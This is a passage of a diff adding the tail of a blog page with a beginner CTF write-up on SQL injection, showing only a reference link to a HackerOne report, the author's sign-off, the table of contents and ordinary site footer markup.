+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/531051">SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database | HackerOne</a></li>
+</ul>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/Misc/">Misc</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SQL-Injection/" rel="tag">SQL Injection</a>, <a class="tag-link-link" href="/tags/beginner/" rel="tag">beginner</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Vulnerability"><span class="toc-number">2.</span> <span class="toc-text">SQL Injection Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-easy-way-SQLMap"><span class="toc-number">3.</span> <span class="toc-text">The easy way - SQLMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigation"><span class="toc-number">4.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">5.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-Example"><span class="toc-number">6.</span> <span class="toc-text">Real Life Example</span></a></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
